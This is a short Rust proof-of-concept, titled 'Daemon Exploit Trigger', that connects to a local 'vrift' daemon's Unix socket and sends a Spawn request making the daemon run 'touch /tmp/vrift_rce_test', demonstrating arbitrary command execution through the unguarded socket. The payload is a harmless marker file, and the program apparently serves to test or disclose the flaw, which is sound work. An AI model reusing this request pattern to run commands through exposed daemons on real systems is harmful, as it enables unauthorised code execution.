use tokio::net::UnixStream;
use vrift_ipc::{frame_async, VeloRequest, VeloResponse};

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let socket_path = "/tmp/vrift.sock";
    let _victim_file = "/tmp/vrift_victim_file";

    println!("--- Daemon Exploit Trigger (Rust) ---");

    let mut stream = UnixStream::connect(socket_path).await?;
    println!("[+] Connected to daemon.");

    // VeloRequest::Spawn { command, env, cwd }
    let req = VeloRequest::Spawn {
        command: vec!["touch".to_string(), "/tmp/vrift_rce_test".to_string()],
        env: vec![],
        cwd: "/tmp".to_string(),
    };

    println!("[+] Sending Spawn request (touch /tmp/vrift_rce_test)...");
    let _seq = frame_async::send_request(&mut stream, &req).await?;

    let (_header, resp) = frame_async::read_response(&mut stream).await?;
    println!("[+] Received response: {:?}", resp);

    match resp {
        VeloResponse::SpawnAck { pid } => println!("[+] Spawned process with PID: {}", pid),
        VeloResponse::Error(e) => println!("[-] Error: {}", e),
        _ => println!("[?] Unexpected response type"),
    }

    Ok(())
}
